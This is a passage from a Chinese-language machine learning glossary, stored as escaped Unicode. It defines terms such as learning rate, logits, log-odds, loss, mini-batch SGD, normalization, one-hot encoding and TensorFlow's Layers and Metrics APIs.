\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a Estimator \u3002 12.9. Layers API (tf.layers) # \u4e00\u79cd TensorFlow API\uff0c\u7528\u4e8e\u4ee5\u5c42\u7ec4\u5408\u7684\u65b9\u5f0f\u6784\u5efa \u6df1\u5ea6 \u795e\u7ecf\u7f51\u7edc\u3002\u901a\u8fc7 Layers API\uff0c\u60a8\u53ef\u4ee5\u6784\u5efa\u4e0d\u540c\u7c7b\u578b\u7684 \u5c42 \uff0c\u4f8b\u5982\uff1a \u901a\u8fc7 tf.layers.Dense \u6784\u5efa \u5168\u8fde\u63a5\u5c42 \u3002 \u901a\u8fc7 tf.layers.Conv2D \u6784\u5efa\u5377\u79ef\u5c42\u3002 \u5728\u7f16\u5199 \u81ea\u5b9a\u4e49 Estimator \u65f6\uff0c\u60a8\u53ef\u4ee5\u7f16\u5199\"\u5c42\"\u5bf9\u8c61\u6765\u5b9a\u4e49\u6240\u6709 \u9690\u85cf\u5c42 \u7684\u7279\u5f81\u3002 Layers API \u9075\u5faa Keras layers API \u89c4\u8303\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9664\u4e86\u524d\u7f00\u4e0d\u540c\u4ee5\u5916\uff0cLayers API \u4e2d\u7684\u6240\u6709\u51fd\u6570\u5747\u4e0e Keras layers API \u4e2d\u7684\u5bf9\u5e94\u51fd\u6570\u5177\u6709\u76f8\u540c\u7684\u540d\u79f0\u548c\u7b7e\u540d\u3002 12.10. \u5b66\u4e60\u901f\u7387 (learning rate) # \u5728\u8bad\u7ec3\u6a21\u578b\u65f6\u7528\u4e8e\u68af\u5ea6\u4e0b\u964d\u7684\u4e00\u4e2a\u6807\u91cf\u3002\u5728\u6bcf\u6b21\u8fed\u4ee3\u671f\u95f4\uff0c \u68af\u5ea6\u4e0b\u964d\u6cd5 \u90fd\u4f1a\u5c06\u5b66\u4e60\u901f\u7387\u4e0e\u68af\u5ea6\u76f8\u4e58\u3002\u5f97\u51fa\u7684\u4e58\u79ef\u79f0\u4e3a\u68af\u5ea6\u6b65\u957f\u3002 \u5b66\u4e60\u901f\u7387\u662f\u4e00\u4e2a\u91cd\u8981\u7684 \u8d85\u53c2\u6570 \u3002 12.11. \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 (least squares regression) # \u4e00\u79cd\u901a\u8fc7\u6700\u5c0f\u5316 L_2 \u635f\u5931 \u8bad\u7ec3\u51fa\u7684\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u3002 12.12. \u7ebf\u6027\u56de\u5f52 (linear regression) # \u4e00\u79cd \u56de\u5f52\u6a21\u578b \uff0c\u901a\u8fc7\u5c06\u8f93\u5165\u7279\u5f81\u8fdb\u884c\u7ebf\u6027\u7ec4\u5408\u8f93\u51fa\u8fde\u7eed\u503c\u3002 12.13. \u903b\u8f91\u56de\u5f52 (logistic regression) # \u4e00\u79cd\u6a21\u578b\uff0c\u901a\u8fc7\u5c06 S \u578b\u51fd\u6570 \u5e94\u7528\u4e8e\u7ebf\u6027\u9884\u6d4b\uff0c\u751f\u6210\u5206\u7c7b\u95ee\u9898\u4e2d\u6bcf\u4e2a\u53ef\u80fd\u7684\u79bb\u6563\u6807\u7b7e\u503c\u7684\u6982\u7387\u3002\u867d\u7136\u903b\u8f91\u56de\u5f52\u7ecf\u5e38\u7528\u4e8e \u4e8c\u5143\u5206\u7c7b \u95ee\u9898\uff0c\u4f46\u4e5f\u53ef\u7528\u4e8e \u591a\u7c7b\u522b \u5206\u7c7b\u95ee\u9898\uff08\u5176\u53eb\u6cd5\u53d8\u4e3a\u591a\u7c7b\u522b\u903b\u8f91\u56de\u5f52\u6216\u591a\u9879\u56de\u5f52\uff09\u3002 12.14. \u5bf9\u6570 (logits) # \u5206\u7c7b\u6a21\u578b\u751f\u6210\u7684\u539f\u59cb\uff08\u975e\u6807\u51c6\u5316\uff09\u9884\u6d4b\u5411\u91cf\uff0c\u901a\u5e38\u4f1a\u4f20\u9012\u7ed9\u6807\u51c6\u5316\u51fd\u6570\u3002\u5982\u679c\u6a21\u578b\u8981\u89e3\u51b3\u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898\uff0c\u5219\u5bf9\u6570\u901a\u5e38\u53d8\u6210 softmax \u51fd\u6570 \u7684\u8f93\u5165\u3002\u4e4b\u540e\uff0csoftmax \u51fd\u6570\u4f1a\u751f\u6210\u4e00\u4e2a\uff08\u6807\u51c6\u5316\uff09\u6982\u7387\u5411\u91cf\uff0c\u5bf9\u5e94\u4e8e\u6bcf\u4e2a\u53ef\u80fd\u7684\u7c7b\u522b\u3002 \u6b64\u5916\uff0c\u5bf9\u6570\u6709\u65f6\u4e5f\u79f0\u4e3a S \u578b\u51fd\u6570 \u7684\u5143\u7d20\u7ea7\u53cd\u51fd\u6570\u3002\u5982\u9700\u4e86\u89e3\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 tf.nn.sigmoid_cross_entropy_with_logits \u3002 12.15. \u5bf9\u6570\u635f\u5931\u51fd\u6570 (Log Loss) # \u4e8c\u5143 \u903b\u8f91\u56de\u5f52 \u4e2d\u4f7f\u7528\u7684 \u635f\u5931 \u51fd\u6570\u3002 12.16. \u5bf9\u6570\u51e0\u7387 (log-odds) # \u67d0\u4e2a\u4e8b\u4ef6\u51e0\u7387\u7684\u5bf9\u6570\u3002 \u5982\u679c\u4e8b\u4ef6\u6d89\u53ca\u4e8c\u5143\u6982\u7387\uff0c\u5219\u51e0\u7387\u6307\u7684\u662f\u6210\u529f\u6982\u7387 (p) \u4e0e\u5931\u8d25\u6982\u7387 (1-p) \u4e4b\u6bd4\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u7ed9\u5b9a\u4e8b\u4ef6\u7684\u6210\u529f\u6982\u7387\u4e3a 90\uff05\uff0c\u5931\u8d25\u6982\u7387\u4e3a 10\uff05\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u51e0\u7387\u7684\u8ba1\u7b97\u516c\u5f0f\u5982\u4e0b\uff1a \\text{\u51e0\u7387} = \\frac{p}{(1- p)} = \\frac{0.9}{0.1} = 9 \u7b80\u5355\u6765\u8bf4\uff0c\u5bf9\u6570\u51e0\u7387\u5373\u51e0\u7387\u7684\u5bf9\u6570\u3002\u6309\u7167\u60ef\u4f8b\uff0c\"\u5bf9\u6570\"\u6307\u81ea\u7136\u5bf9\u6570\uff0c\u4f46\u5bf9\u6570\u7684\u57fa\u6570\u5176\u5b9e\u53ef\u4ee5\u662f\u4efb\u4f55\u5927\u4e8e 1 \u7684\u6570\u3002\u82e5\u9075\u5faa\u60ef\u4f8b\uff0c\u4e0a\u8ff0\u793a\u4f8b\u7684\u5bf9\u6570\u51e0\u7387\u5e94\u4e3a\uff1a \\text{\u5bf9\u6570\u51e0\u7387} = \\ln(9) = 2.2 \u5bf9\u6570\u51e0\u7387\u662f S \u578b\u51fd\u6570 \u7684\u53cd\u51fd\u6570\u3002 12.17. \u635f\u5931 (Loss) # \u4e00\u79cd\u8861\u91cf\u6307\u6807\uff0c\u7528\u4e8e\u8861\u91cf\u6a21\u578b\u7684 \u9884\u6d4b \u504f\u79bb\u5176 \u6807\u7b7e \u7684\u7a0b\u5ea6\u3002\u6216\u8005\u66f4\u60b2\u89c2\u5730\u8bf4\u662f\u8861\u91cf\u6a21\u578b\u6709\u591a\u5dee\u3002\u8981\u786e\u5b9a\u6b64\u503c\uff0c\u6a21\u578b\u5fc5\u987b\u5b9a\u4e49\u635f\u5931\u51fd\u6570\u3002\u4f8b\u5982\uff0c\u7ebf\u6027\u56de\u5f52\u6a21\u578b\u901a\u5e38\u5c06 \u5747\u65b9\u8bef\u5dee \u7528\u4f5c\u635f\u5931\u51fd\u6570\uff0c\u800c\u903b\u8f91\u56de\u5f52\u6a21\u578b\u5219\u4f7f\u7528 \u5bf9\u6570\u635f\u5931\u51fd\u6570 \u3002 13. M # 13.1. \u673a\u5668\u5b66\u4e60 (machine learning) # \u4e00\u79cd\u7a0b\u5e8f\u6216\u7cfb\u7edf\uff0c\u7528\u4e8e\u6839\u636e\u8f93\u5165\u6570\u636e\u6784\u5efa\uff08\u8bad\u7ec3\uff09\u9884\u6d4b\u6a21\u578b\u3002\u8fd9\u79cd\u7cfb\u7edf\u4f1a\u5229\u7528\u5b66\u5230\u7684\u6a21\u578b\u6839\u636e\u4ece\u5206\u5e03\uff08\u8bad\u7ec3\u8be5\u6a21\u578b\u65f6\u4f7f\u7528\u7684\u540c\u4e00\u5206\u5e03\uff09\u4e2d\u63d0\u53d6\u7684\u65b0\u6570\u636e\uff08\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u6570\u636e\uff09\u8fdb\u884c\u5b9e\u7528\u7684\u9884\u6d4b\u3002\u673a\u5668\u5b66\u4e60\u8fd8\u6307\u4e0e\u8fd9\u4e9b\u7a0b\u5e8f\u6216\u7cfb\u7edf\u76f8\u5173\u7684\u7814\u7a76\u9886\u57df\u3002 13.2. \u5747\u65b9\u8bef\u5dee (MSE, Mean Squared Error) # \u6bcf\u4e2a\u6837\u672c\u7684\u5e73\u5747\u5e73\u65b9\u635f\u5931\u3002MSE \u7684\u8ba1\u7b97\u65b9\u6cd5\u662f \u5e73\u65b9\u635f\u5931 \u9664\u4ee5 \u6837\u672c \u6570\u3002 TensorFlow Playground \u663e\u793a\u7684\"\u8bad\u7ec3\u635f\u5931\"\u503c\u548c\"\u6d4b\u8bd5\u635f\u5931\"\u503c\u90fd\u662f MSE\u3002 13.3. \u6307\u6807 (metric) # \u60a8\u5173\u5fc3\u7684\u4e00\u4e2a\u6570\u503c\u3002\u53ef\u80fd\u53ef\u4ee5\u4e5f\u53ef\u80fd\u4e0d\u53ef\u4ee5\u76f4\u63a5\u5728\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u4e2d\u5f97\u5230\u4f18\u5316\u3002\u60a8\u7684\u7cfb\u7edf\u5c1d\u8bd5\u4f18\u5316\u7684\u6307\u6807\u79f0\u4e3a \u76ee\u6807 \u3002 13.4. Metrics API (tf.metrics) # \u4e00\u79cd\u7528\u4e8e\u8bc4\u4f30\u6a21\u578b\u7684 TensorFlow API\u3002\u4f8b\u5982\uff0c tf.metrics.accuracy \u7528\u4e8e\u786e\u5b9a\u6a21\u578b\u7684\u9884\u6d4b\u4e0e\u6807\u7b7e\u5339\u914d\u7684\u9891\u7387\u3002\u5728\u7f16\u5199 \u81ea\u5b9a\u4e49 Estimator \u65f6\uff0c\u60a8\u53ef\u4ee5\u8c03\u7528 Metrics API \u51fd\u6570\u6765\u6307\u5b9a\u5e94\u5982\u4f55\u8bc4\u4f30\u60a8\u7684\u6a21\u578b\u3002 13.5. \u5c0f\u6279\u6b21 (mini-batch) # \u4ece\u6574\u6279 \u6837\u672c \u5185\u968f\u673a\u9009\u62e9\u5e76\u5728\u8bad\u7ec3\u6216\u63a8\u65ad\u8fc7\u7a0b\u7684\u4e00\u6b21\u8fed\u4ee3\u4e2d\u4e00\u8d77\u8fd0\u884c\u7684\u4e00\u5c0f\u90e8\u5206\u6837\u672c\u3002\u5c0f\u6279\u6b21\u7684 \u6279\u6b21\u5927\u5c0f \u901a\u5e38\u4ecb\u4e8e 10 \u5230 1000 \u4e4b\u95f4\u3002\u4e0e\u57fa\u4e8e\u5b8c\u6574\u7684\u8bad\u7ec3\u6570\u636e\u8ba1\u7b97\u635f\u5931\u76f8\u6bd4\uff0c\u57fa\u4e8e\u5c0f\u6279\u6b21\u6570\u636e\u8ba1\u7b97\u635f\u5931\u8981\u9ad8\u6548\u5f97\u591a\u3002 13.6. \u5c0f\u6279\u6b21\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, mini-batch stochastic gradient descent) # \u4e00\u79cd\u91c7\u7528 \u5c0f\u6279\u6b21 \u6837\u672c\u7684 \u68af\u5ea6\u4e0b\u964d\u6cd5 \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c0f\u6279\u6b21 SGD \u4f1a\u6839\u636e\u4e00\u5c0f\u90e8\u5206\u8bad\u7ec3\u6570\u636e\u6765\u4f30\u7b97\u68af\u5ea6\u3002 Vanilla SGD \u4f7f\u7528\u7684\u5c0f\u6279\u6b21\u7684\u5927\u5c0f\u4e3a 1\u3002 13.7. ML # \u673a\u5668\u5b66\u4e60 \u7684\u7f29\u5199\u3002 13.8. \u6a21\u578b (model) # \u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u4ece\u8bad\u7ec3\u6570\u636e\u5b66\u5230\u7684\u5185\u5bb9\u7684\u8868\u793a\u5f62\u5f0f\u3002\u591a\u542b\u4e49\u672f\u8bed\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e0b\u5217\u4e24\u79cd\u76f8\u5173\u542b\u4e49\u4e4b\u4e00\uff1a \u4e00\u79cd TensorFlow \u56fe\uff0c\u7528\u4e8e\u8868\u793a\u9884\u6d4b\u7684\u8ba1\u7b97\u7ed3\u6784\u3002 \u8be5 TensorFlow \u56fe\u7684\u7279\u5b9a\u6743\u91cd\u548c\u504f\u5dee\uff0c\u901a\u8fc7 \u8bad\u7ec3 \u51b3\u5b9a\u3002 13.9. \u6a21\u578b\u51fd\u6570 (model function) # Estimator \u4e2d\u7684\u51fd\u6570\uff0c\u7528\u4e8e\u5b9e\u73b0\u673a\u5668\u5b66\u4e60\u8bad\u7ec3\u3001\u8bc4\u4f30\u548c\u63a8\u65ad\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u51fd\u6570\u7684\u8bad\u7ec3\u90e8\u5206\u53ef\u4ee5\u5904\u7406\u4ee5\u4e0b\u4efb\u52a1\uff1a\u5b9a\u4e49\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u7684\u62d3\u6251\u5e76\u786e\u5b9a\u5176 \u4f18\u5316\u5668 \u51fd\u6570\u3002\u5982\u679c\u4f7f\u7528 \u9884\u521b\u5efa\u7684 Estimator \uff0c\u5219\u6709\u4eba\u5df2\u4e3a\u60a8\u7f16\u5199\u4e86\u6a21\u578b\u51fd\u6570\u3002\u5982\u679c\u4f7f\u7528 \u81ea\u5b9a\u4e49 Estimator \uff0c\u5219\u5fc5\u987b\u81ea\u884c\u7f16\u5199\u6a21\u578b\u51fd\u6570\u3002 \u6709\u5173\u7f16\u5199\u6a21\u578b\u51fd\u6570\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u521b\u5efa\u81ea\u5b9a\u4e49 Estimator \u3002 13.10. \u6a21\u578b\u8bad\u7ec3 (model training) # \u786e\u5b9a\u6700\u4f73 \u6a21\u578b \u7684\u8fc7\u7a0b\u3002 13.11. \u52a8\u91cf (Momentum) # \u4e00\u79cd\u5148\u8fdb\u7684\u68af\u5ea6\u4e0b\u964d\u6cd5\uff0c\u5176\u4e2d\u5b66\u4e60\u6b65\u957f\u4e0d\u4ec5\u53d6\u51b3\u4e8e\u5f53\u524d\u6b65\u957f\u7684\u5bfc\u6570\uff0c\u8fd8\u53d6\u51b3\u4e8e\u4e4b\u524d\u4e00\u6b65\u6216\u591a\u6b65\u7684\u6b65\u957f\u7684\u5bfc\u6570\u3002\u52a8\u91cf\u6d89\u53ca\u8ba1\u7b97\u68af\u5ea6\u968f\u65f6\u95f4\u800c\u53d8\u5316\u7684\u6307\u6570\u7ea7\u52a0\u6743\u79fb\u52a8\u5e73\u5747\u503c\uff0c\u4e0e\u7269\u7406\u5b66\u4e2d\u7684\u52a8\u91cf\u7c7b\u4f3c\u3002\u52a8\u91cf\u6709\u65f6\u53ef\u4ee5\u9632\u6b62\u5b66\u4e60\u8fc7\u7a0b\u88ab\u5361\u5728\u5c40\u90e8\u6700\u5c0f\u7684\u60c5\u51b5\u3002 13.12. \u591a\u7c7b\u522b\u5206\u7c7b (multi-class classification) # \u533a\u5206\u4e24\u79cd\u4ee5\u4e0a\u7c7b\u522b\u7684\u5206\u7c7b\u95ee\u9898\u3002\u4f8b\u5982\uff0c\u67ab\u6811\u5927\u7ea6\u6709 128 \u79cd\uff0c\u56e0\u6b64\uff0c\u786e\u5b9a\u67ab\u6811\u79cd\u7c7b\u7684\u6a21\u578b\u5c31\u5c5e\u4e8e\u591a\u7c7b\u522b\u6a21\u578b\u3002\u53cd\u4e4b\uff0c\u4ec5\u5c06\u7535\u5b50\u90ae\u4ef6\u5206\u4e3a\u4e24\u7c7b\uff08\"\u5783\u573e\u90ae\u4ef6\"\u548c\"\u975e\u5783\u573e\u90ae\u4ef6\"\uff09\u7684\u6a21\u578b\u5c5e\u4e8e \u4e8c\u5143\u5206\u7c7b\u6a21\u578b \u3002 13.13. \u591a\u9879\u5206\u7c7b (multinomial classification) # \u4e0e \u591a\u7c7b\u522b\u5206\u7c7b \u7684\u542b\u4e49\u76f8\u540c\u3002 14. N # 14.1. NaN \u9677\u9631 (NaN trap) # \u6a21\u578b\u4e2d\u7684\u4e00\u4e2a\u6570\u5b57\u5728\u8bad\u7ec3\u671f\u95f4\u53d8\u6210 NaN \uff0c\u8fd9\u4f1a\u5bfc\u81f4\u6a21\u578b\u4e2d\u7684\u5f88\u591a\u6216\u6240\u6709\u5176\u4ed6\u6570\u5b57\u6700\u7ec8\u4e5f\u4f1a\u53d8\u6210 NaN\u3002 NaN \u662f\"\u975e\u6570\u5b57\"\u7684\u7f29\u5199\u3002 14.2. \u8d1f\u7c7b\u522b (negative class) # \u5728 \u4e8c\u5143\u5206\u7c7b \u4e2d\uff0c\u4e00\u79cd\u7c7b\u522b\u79f0\u4e3a\u6b63\u7c7b\u522b\uff0c\u53e6\u4e00\u79cd\u7c7b\u522b\u79f0\u4e3a\u8d1f\u7c7b\u522b\u3002\u6b63\u7c7b\u522b\u662f\u6211\u4eec\u8981\u5bfb\u627e\u7684\u7c7b\u522b\uff0c\u8d1f\u7c7b\u522b\u5219\u662f\u53e6\u4e00\u79cd\u53ef\u80fd\u6027\u3002\u4f8b\u5982\uff0c\u5728\u533b\u5b66\u68c0\u67e5\u4e2d\uff0c\u8d1f\u7c7b\u522b\u53ef\u4ee5\u662f\"\u975e\u80bf\u7624\"\u3002\u5728\u7535\u5b50\u90ae\u4ef6\u5206\u7c7b\u5668\u4e2d\uff0c\u8d1f\u7c7b\u522b\u53ef\u4ee5\u662f\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002\u53e6\u8bf7\u53c2\u9605 \u6b63\u7c7b\u522b \u3002 14.3. \u795e\u7ecf\u7f51\u7edc (neural network) # \u4e00\u79cd\u6a21\u578b\uff0c\u7075\u611f\u6765\u6e90\u4e8e\u8111\u90e8\u7ed3\u6784\uff0c\u7531\u591a\u4e2a\u5c42\u6784\u6210\uff08\u81f3\u5c11\u6709\u4e00\u4e2a\u662f \u9690\u85cf\u5c42 \uff09\uff0c\u6bcf\u4e2a\u5c42\u90fd\u5305\u542b\u7b80\u5355\u76f8\u8fde\u7684\u5355\u5143\u6216 \u795e\u7ecf\u5143 \uff08\u5177\u6709\u975e\u7ebf\u6027\u5173\u7cfb\uff09\u3002 14.4. \u795e\u7ecf\u5143 (neuron) # \u795e\u7ecf\u7f51\u7edc \u4e2d\u7684\u8282\u70b9\uff0c\u901a\u5e38\u4f1a\u63a5\u6536\u591a\u4e2a\u8f93\u5165\u503c\u5e76\u751f\u6210\u4e00\u4e2a\u8f93\u51fa\u503c\u3002\u795e\u7ecf\u5143\u901a\u8fc7\u5c06 \u6fc0\u6d3b\u51fd\u6570 \uff08\u975e\u7ebf\u6027\u8f6c\u6362\uff09\u5e94\u7528\u4e8e\u8f93\u5165\u503c\u7684\u52a0\u6743\u548c\u6765\u8ba1\u7b97\u8f93\u51fa\u503c\u3002 14.5. \u8282\u70b9 (node) # \u591a\u542b\u4e49\u672f\u8bed\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e0b\u5217\u4e24\u79cd\u542b\u4e49\u4e4b\u4e00\uff1a \u9690\u85cf\u5c42 \u4e2d\u7684\u795e\u7ecf\u5143\u3002 TensorFlow \u56fe \u4e2d\u7684\u64cd\u4f5c\u3002 14.6. \u6807\u51c6\u5316 (normalization) # \u5c06\u5b9e\u9645\u7684\u503c\u533a\u95f4\u8f6c\u6362\u4e3a\u6807\u51c6\u7684\u503c\u533a\u95f4\uff08\u901a\u5e38\u4e3a -1 \u5230 +1 \u6216 0 \u5230 1\uff09\u7684\u8fc7\u7a0b\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u7279\u5f81\u7684\u81ea\u7136\u533a\u95f4\u662f 800 \u5230 6000\u3002\u901a\u8fc7\u51cf\u6cd5\u548c\u9664\u6cd5\u8fd0\u7b97\uff0c\u60a8\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u503c\u6807\u51c6\u5316\u4e3a\u4f4d\u4e8e -1 \u5230 +1 \u533a\u95f4\u5185\u3002 \u53e6\u8bf7\u53c2\u9605 \u7f29\u653e \u3002 14.7. \u6570\u503c\u6570\u636e (numerical data) # \u7528\u6574\u6570\u6216\u5b9e\u6570\u8868\u793a\u7684 \u7279\u5f81 \u3002\u4f8b\u5982\uff0c\u5728\u623f\u5730\u4ea7\u6a21\u578b\u4e2d\uff0c\u60a8\u53ef\u80fd\u4f1a\u7528\u6570\u503c\u6570\u636e\u8868\u793a\u623f\u5b50\u5927\u5c0f\uff08\u4ee5\u5e73\u65b9\u82f1\u5c3a\u6216\u5e73\u65b9\u7c73\u4e3a\u5355\u4f4d\uff09\u3002\u5982\u679c\u7528\u6570\u503c\u6570\u636e\u8868\u793a\u7279\u5f81\uff0c\u5219\u53ef\u4ee5\u8868\u660e\u7279\u5f81\u7684\u503c\u76f8\u4e92\u4e4b\u95f4\u5177\u6709\u6570\u5b66\u5173\u7cfb\uff0c\u5e76\u4e14\u4e0e\u6807\u7b7e\u53ef\u80fd\u4e5f\u6709\u6570\u5b66\u5173\u7cfb\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7528\u6570\u503c\u6570\u636e\u8868\u793a\u623f\u5b50\u5927\u5c0f\uff0c\u5219\u53ef\u4ee5\u8868\u660e\u9762\u79ef\u4e3a 200 \u5e73\u65b9\u7c73\u7684\u623f\u5b50\u662f\u9762\u79ef\u4e3a 100 \u5e73\u65b9\u7c73\u7684\u623f\u5b50\u7684\u4e24\u500d\u3002\u6b64\u5916\uff0c\u623f\u5b50\u9762\u79ef\u7684\u5e73\u65b9\u7c73\u6570\u53ef\u80fd\u4e0e\u623f\u4ef7\u5b58\u5728\u4e00\u5b9a\u7684\u6570\u5b66\u5173\u7cfb\u3002 \u5e76\u975e\u6240\u6709\u6574\u6570\u6570\u636e\u90fd\u5e94\u8868\u793a\u6210\u6570\u503c\u6570\u636e\u3002\u4f8b\u5982\uff0c\u4e16\u754c\u4e0a\u67d0\u4e9b\u5730\u533a\u7684\u90ae\u653f\u7f16\u7801\u662f\u6574\u6570\uff0c\u4f46\u5728\u6a21\u578b\u4e2d\uff0c\u4e0d\u5e94\u5c06\u6574\u6570\u90ae\u653f\u7f16\u7801\u8868\u793a\u6210\u6570\u503c\u6570\u636e\u3002\u8fd9\u662f\u56e0\u4e3a\u90ae\u653f\u7f16\u7801 20000 \u5728\u6548\u529b\u4e0a\u5e76\u4e0d\u662f\u90ae\u653f\u7f16\u7801 10000 \u7684\u4e24\u500d\uff08\u6216\u4e00\u534a\uff09\u3002\u6b64\u5916\uff0c\u867d\u7136\u4e0d\u540c\u7684\u90ae\u653f\u7f16\u7801\u786e\u5b9e\u4e0e\u4e0d\u540c\u7684\u623f\u5730\u4ea7\u4ef7\u503c\u6709\u5173\uff0c\u4f46\u6211\u4eec\u4e5f\u4e0d\u80fd\u5047\u8bbe\u90ae\u653f\u7f16\u7801\u4e3a 20000 \u7684\u623f\u5730\u4ea7\u5728\u4ef7\u503c\u4e0a\u662f\u90ae\u653f\u7f16\u7801\u4e3a 10000 \u7684\u623f\u5730\u4ea7\u7684\u4e24\u500d\u3002\u90ae\u653f\u7f16\u7801\u5e94\u8868\u793a\u6210 \u5206\u7c7b\u6570\u636e \u3002 \u6570\u503c\u7279\u5f81\u6709\u65f6\u79f0\u4e3a \u8fde\u7eed\u7279\u5f81 \u3002 14.8. Numpy # \u4e00\u4e2a \u5f00\u653e\u6e90\u4ee3\u7801\u6570\u5b66\u5e93 \uff0c\u5728 Python \u4e2d\u63d0\u4f9b\u9ad8\u6548\u7684\u6570\u7ec4\u64cd\u4f5c\u3002 Pandas \u5efa\u7acb\u5728 Numpy \u4e4b\u4e0a\u3002 15. O # 15.1. \u76ee\u6807 (objective) # \u7b97\u6cd5\u5c1d\u8bd5\u4f18\u5316\u7684\u6307\u6807\u3002 15.2. \u79bb\u7ebf\u63a8\u65ad (offline inference) # \u751f\u6210\u4e00\u7ec4 \u9884\u6d4b \uff0c\u5b58\u50a8\u8fd9\u4e9b\u9884\u6d4b\uff0c\u7136\u540e\u6839\u636e\u9700\u6c42\u68c0\u7d22\u8fd9\u4e9b\u9884\u6d4b\u3002\u4e0e \u5728\u7ebf\u63a8\u65ad \u76f8\u5bf9\u3002 15.3. \u72ec\u70ed\u7f16\u7801 (one-hot encoding) # \u4e00\u79cd\u7a00\u758f\u5411\u91cf\uff0c\u5176\u4e2d\uff1a \u4e00\u4e2a\u5143\u7d20\u8bbe\u4e3a 1\u3002 \u6240\u6709\u5176\u4ed6\u5143\u7d20\u5747\u8bbe\u4e3a 0\u3002 \u72ec\u70ed\u7f16\u7801\u5e38\u7528\u4e8e\u8868\u793a\u62e5\u6709\u6709\u9650\u4e2a\u53ef\u80fd\u503c\u7684\u5b57\u7b26\u4e32\u6216\u6807\u8bc6\u7b26\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u6307\u5b9a\u7684\u690d\u7269\u5b66\u6570\u636e\u96c6\u8bb0\u5f55\u4e86 15000 \u4e2a\u4e0d\u540c\u7684\u7269\u79cd\uff0c\u5176\u4e2d\u6bcf\u4e2a\u7269\u79cd\u90fd\u7528\u72ec\u4e00\u65e0\u4e8c\u7684\u5b57\u7b26\u4e32\u6807\u8bc6\u7b26\u6765\u8868\u793a\u3002\u5728\u7279\u5f81\u5de5\u7a0b\u8fc7\u7a0b\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6807\u8bc6\u7b26\u7f16\u7801\u4e3a\u72ec\u70ed\u5411\u91cf\uff0c\u5411\u91cf\u7684\u5927\u5c0f\u4e3a 15000\u3002 15.4. \u5355\u6837\u672c\u5b66\u4e60\uff08one-shot learning\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff09 # \u4e00\u79cd\u673a\u5668\u5b66\u4e60\u65b9\u6cd5\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff0c\u65e8\u5728\u901a\u8fc7\u5355\u4e2a\u8bad\u7ec3\u6837\u672c\u5b66\u4e60\u6709\u6548\u7684\u5206\u7c7b\u5668\u3002 \u53e6\u8bf7\u53c2\u9605 \u5c11\u91cf\u6837\u672c\u5b66\u4e60 \u3002 15.5. \u4e00\u5bf9\u591a (one-vs.-all) # \u5047\u8bbe\u67d0\u4e2a\u5206\u7c7b\u95ee\u9898\u6709 N \u79cd\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u4e00\u5bf9\u591a\u89e3\u51b3\u65b9\u6848\u5c06\u5305\u542b N \u4e2a\u5355\u72ec\u7684 \u4e8c\u5143\u5206\u7c7b\u5668 - \u4e00\u4e2a\u4e8c\u5143\u5206\u7c7b\u5668\u5bf9\u5e94\u4e00\u79cd\u53ef\u80fd\u7684\u7ed3\u679c\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u67d0\u4e2a\u6a21\u578b\u7528\u4e8e\u533a\u5206\u6837\u672c\u5c5e\u4e8e\u52a8\u7269\u3001\u852c\u83dc\u8fd8\u662f\u77ff\u7269\uff0c\u4e00\u5bf9\u591a\u89e3\u51b3\u65b9\u6848\u5c06\u63d0\u4f9b\u4e0b\u5217\u4e09\u4e2a\u5355\u72ec\u7684\u4e8c\u5143\u5206\u7c7b\u5668\uff1a \u52a8\u7269\u548c\u975e\u52a8\u7269 \u852c\u83dc\u548c\u975e\u852c\u83dc \u77ff\u7269\u548c\u975e\u77ff\u7269 15.6. \u5728\u7ebf\u63a8\u65ad (online inference) # \u6839\u636e\u9700\u6c42\u751f\u6210 \u9884\u6d4b \u3002\u4e0e \u79bb\u7ebf\u63a8\u65ad \u76f8\u5bf9\u3002 15.7. \u64cd\u4f5c (op, Operation) # TensorFlow \u56fe\u4e2d\u7684\u8282\u70b9\u3002\u5728 TensorFlow \u4e2d\uff0c\u4efb\u4f55\u521b\u5efa\u3001\u64cd\u7eb5\u6216\u9500\u6bc1 \u5f20\u91cf \u7684\u8fc7\u7a0b\u90fd\u5c5e\u4e8e\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u77e9\u9635\u76f8\u4e58\u5c31\u662f\u4e00\u79cd\u64cd\u4f5c\uff0c\u8be5\u64cd\u4f5c\u4ee5\u4e24\u4e2a\u5f20\u91cf\u4f5c\u4e3a\u8f93\u5165\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u5f20\u91cf\u4f5c\u4e3a\u8f93\u51fa\u3002 15.8. \u4f18\u5316\u5668 (optimizer) # \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u4e00\u79cd\u5177\u4f53\u5b9e\u73b0\u3002TensorFlow \u7684\u4f18\u5316\u5668\u57fa\u7c7b\u662f tf.train.Optimizer 